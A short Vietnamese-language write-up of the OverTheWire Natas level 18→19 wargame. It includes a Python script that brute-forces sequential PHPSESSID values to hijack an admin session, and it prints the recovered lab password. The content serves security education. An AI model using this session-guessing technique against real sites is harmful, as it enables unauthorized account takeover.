# Natas 18 → 19

## Mục tiêu

Lấy password của `natas19` bằng cách chiếm session admin.

## Tôi thấy

Source dùng `PHPSESSID` dạng số từ `1` đến `640`. Khi đăng nhập với username `admin`, session được đánh dấu `admin = 0` vì hàm kiểm tra login bị vô hiệu hóa. Nhưng session ID được đoán tuần tự.

## Cách làm

```python
import requests

for sid in range(1, 641):
    r = requests.post(
        'http://natas18.natas.labs.overthewire.org/',
        auth=('natas18', '<password>'),
        data={'username': 'admin', 'password': 'x'},
        cookies={'PHPSESSID': str(sid)},
    )
    if 'You are an admin' in r.text:
        print(r.text)
```

Session `119` trả về thông tin admin.

## Vì sao cách này hiệu quả

Server chấp nhận session ID do client cung cấp và giới hạn không gian thử chỉ còn `1..640`. Session ID đúng chứa trạng thái admin đã được tạo bởi request login.

## Kết quả

Password của `natas19`:

```text
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```

